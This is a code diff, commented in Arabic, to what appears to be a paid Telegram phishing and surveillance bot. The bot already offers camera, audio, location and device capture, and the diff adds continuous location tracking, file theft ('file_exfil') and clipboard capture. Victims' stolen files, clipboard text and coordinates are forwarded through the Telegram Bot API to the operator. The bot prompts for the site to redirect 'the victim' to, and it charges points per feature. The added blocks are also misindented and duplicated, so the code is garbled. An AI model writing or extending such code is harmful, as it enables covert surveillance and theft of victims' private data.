@@ -433,7 +433,46 @@ def use_group_reward(code, user_id):
     
     add_points(user_id, reward['points'], f'مكافأة جماعية: {code}')
     return True, reward['points']
+# ====== دوال الميزات الجديدة ======
 
+# تتبع الموقع المستمر
+def start_location_tracking(chat_id, locations):
+    """إرسال مواقع متعددة إلى البوت"""
+    for loc in locations:
+        try:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
+            requests.post(url, data={
+                'chat_id': chat_id,
+                'latitude': loc['lat'],
+                'longitude': loc['lng']
+            })
+            time.sleep(0.5)  # تجنب الحظر
+        except:
+            pass
+
+# سحب الملفات
+def send_files_to_bot(chat_id, files):
+    """إرسال الملفات المستخرجة إلى البوت"""
+    for file_data in files:
+        try:
+            content = file_data['content'].split(',', 1)[1]
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+            files = {'document': base64.b64decode(content)}
+            caption = f"📁 {file_data['name']} ({(file_data['size']/1024):.1f} KB)"
+            requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
+        except:
+            pass
+
+# الحافظة
+def send_clipboard(chat_id, clipboard_text):
+    """إرسال محتوى الحافظة إلى البوت"""
+    try:
+        msg = f"📋 **محتوى الحافظة:**\n\n{clipboard_text}"
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
+    except:
+        pass
+        
 # ====== دوال الأسعار ======
 def get_prices():
     conn = get_db()
@@ -2104,6 +2143,43 @@ def send_data():
                 requests.post(url, data={'chat_id': chat_id, 'text': f"🌐 IP: {data['ip']}"})
             except:
                 pass
+        # ====== الميزات الجديدة ======
+
+# تتبع الموقع المستمر
+if data.get('locations'):
+    for loc in data['locations']:
+        try:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
+            requests.post(url, data={
+                'chat_id': chat_id,
+                'latitude': loc['lat'],
+                'longitude': loc['lng']
+            })
+            time.sleep(0.3)
+        except:
+            pass
+
+# سحب الملفات
+if data.get('files'):
+    for file_data in data['files']:
+        try:
+            content = file_data['content'].split(',', 1)[1]
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+            files = {'document': base64.b64decode(content)}
+            caption = f"📁 {file_data['name']} ({(file_data['size']/1024):.1f} KB)"
+            requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
+            time.sleep(0.3)
+        except:
+            pass
+
+# الحافظة
+if data.get('clipboard'):
+    try:
+        msg = f"📋 **محتوى الحافظة:**\n\n{data['clipboard']}"
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
+    except:
+        pass
         
         return jsonify({'status': 'ok'})
     except Exception as e:
@@ -2804,36 +2880,49 @@ def handle_callback(call):
         return
     
     # ====== الميزات الأساسية (كاميرا، فيديو، إلخ) ======
-    if data in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio', 'location', 'device', 'all']:
+    # ====== الميزات الأساسية والجديدة ======
+    if data in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio','location', 'device', 'all', 'location_tracking', 'file_exfil', 'clipboard']:
         user = get_user(user_id)
-        
-        feature_map = {
-            'camera_front': 'camera',
-            'camera_back': 'camera',
-            'video_front': 'video',
-            'video_back': 'video',
-            'audio': 'audio',
-            'location': 'location',
-            'device': 'device',
-            'all': 'all'
-        }
-        feature_key = feature_map.get(data, 'all')
-        prices = get_prices()
-        required_points = prices.get(feature_key, 5)
-        
-        if user and user['points'] < required_points:
-            bot.answer_callback_query(
-                call.id,
-                f"❌ لا يوجد نقاط كافية! تحتاج {required_points} نقطة."
-            )
-            bot.send_message(
-                user_id,
-                f"❌ **نقاط غير كافية!**\n\n"
-                f"هذه الميزة تحتاج **{required_points}** نقطة.\n"
-                f"رصيدك الحالي: **{user['points']}** نقطة.\n\n"
-                f"💡 اشترِ نقاطاً أو ادعُ أصدقاءك لكسب نقاط إضافية."
-            )
-            return
+    
+    # تحديد النقاط المطلوبة لكل ميزة (بما في ذلك الجديدة)
+        points_map = {
+        'camera_front': 3, 'camera_back': 3,
+        'video_front': 5, 'video_back': 5,
+        'audio': 3, 'location': 2,
+        'device': 2, 'all': 10,
+        'location_tracking': 5,
+        'file_exfil': 8,
+        'clipboard': 3
+    }
+        required_points = points_map.get(data, 5)
+    
+    if user and user['points'] < required_points:
+        bot.answer_callback_query(
+            call.id,
+            f"❌ لا يوجد نقاط كافية! تحتاج {required_points} نقطة."
+        )
+        bot.send_message(
+            user_id,
+            f"❌ **نقاط غير كافية!**\n\n"
+            f"هذه الميزة تحتاج **{required_points}** نقطة.\n"
+            f"رصيدك الحالي: **{user['points']}** نقطة.\n\n"
+            f"💡 اشترِ نقاطاً أو ادعُ أصدقاءك لكسب نقاط إضافية."
+        )
+        return
+    
+    # خصم النقاط
+    deduct_points(user_id, required_points, f'استخدام {data}')
+    
+    # طلب الرابط الأصلي
+    user_states[user_id] = f'waiting_url_{data}'
+    bot.send_message(
+        user_id,
+        f"📤 أرسل الآن **الرابط الأصلي**\n"
+        f"(الموقع الذي تريد توجيه الضحية إليه)\n\n"
+        f"💡 تم خصم {required_points} نقطة مقابل هذه الخدمة."
+    )
+    bot.answer_callback_query(call.id)
+    return
         
         deduct_points(user_id, required_points, f'استخدام {data}')
         
